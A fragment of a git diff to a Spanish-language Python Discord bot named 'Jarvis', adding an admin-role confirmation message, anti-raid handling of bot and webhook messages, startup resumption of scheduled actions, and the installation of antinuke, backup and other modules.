+                description=f'Rol **{new_role.mention}** con permisos de administrador asignado a {owner_member.mention} en **{target_guild.name}** (`{target_guild.id}`).',
+                color=0x2ecc71,
+            )
             embed.timestamp = datetime.now(timezone.utc)
             await message.reply(embed=embed)
         except Exception as e:
@@ -8331,6 +8849,7 @@ async def on_ready():
           f'contexto={JARVIS_CONTEXT_MESSAGES} msgs | confirmar_deducidos={"SI" if JARVIS_CONFIRM_INFERRED else "NO"}')
     await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f'{PREFIX}help | /help'))
     load_reminders(client)
+    resume_jarvis_scheduled_actions()
     antiraid_resume()
     temprole_resume()
     adminstrip_resume()
@@ -8380,7 +8899,13 @@ async def giveaway_checker_loop():
 
 @client.event
 async def on_message(message: discord.Message):
-    if message.author.bot or not message.guild:
+    if not message.guild:
+        return
+    if message.author.bot or getattr(message, 'webhook_id', None):
+        try:
+            await antiraid_on_message(message)
+        except Exception as e:
+            print(f'[AntiRaid] on_message externo: {e}')
         return
 
     # ── AUTO-DELETE WATCH: borra en el acto los mensajes de usuarios vigilados ──
@@ -10291,6 +10816,20 @@ jarvis_devolver_rol.install(sys.modules[__name__])
 import jarvis_musica
 jarvis_musica.install(sys.modules[__name__])
 
+import jarvis_antinuke
+jarvis_antinuke.install(sys.modules[__name__])
+
+import jarvis_backup
+jarvis_backup.install(sys.modules[__name__])
+
+import jarvis_aceptar_owner
+jarvis_aceptar_owner.install(sys.modules[__name__])
+
+import jarvis_interacciones
+jarvis_interacciones.install(sys.modules[__name__])
+
+import jarvis_apps
+jarvis_apps.install(sys.modules[__name__])
 
 # ============================================================================
 # KEEPALIVE
